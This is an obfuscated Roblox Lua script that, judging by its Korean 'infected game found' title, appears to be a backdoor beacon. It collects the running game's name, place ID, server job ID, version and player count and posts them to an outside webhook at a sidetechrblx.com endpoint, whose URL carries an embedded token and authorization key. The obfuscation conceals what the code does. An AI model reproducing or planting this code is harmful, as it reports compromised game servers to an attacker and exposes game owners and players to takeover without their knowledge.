--[[
 .__
__                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.5) ~  Much Love, Ferib 

]]--

local v0="https://api-sidemod.sidetechrblx.com/v3/webhooks/1251483439669055572/Szf8UrXUTIdoLzi1z1Hh7RxyHWVGIucO5eWvMSNrNqhzJGWKVYjIbJ9qQYPYJVvNIoRH?authorization=rEX7R8W3DqxRT409LLQh";local v1=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId);local v2=game:GetService("HttpService");local v3=game.Players:GetPlayers();local v4=game.Players.MaxPlayers;local function v5() local v8=os.date("*t");return ("%02d:%02d"):format((((v8.hour%(643 -(555 + 64))) -1)%12) + (932 -(857 + 74)) ,v8.min);end local v6={embeds={{title="감염게임 발견 바로가기!",url="https://roblox.com/games/"   .. game.PlaceId ,description="**Game Name:** "   .. v1.Name   .. "\n**Players:** "   ..  #v3   .. "/"   .. v4   .. "\n**Game Id:** "   .. game.PlaceId   .. "\n**Game Version:** "   .. game.PlaceVersion   .. "\n**Job Id:** "   .. game.JobId ,image={url="https://t2.rbxcdn.com/0d499b55a8bc928003c91e739d829038"   .. game.PlaceId   .. "&width=768&height=432&format=png" },footer={icon_url=""},color=5815351 -(367 + 201) }}};local v7=v2:JSONEncode(v6);v2:PostAsync(v0,v7);
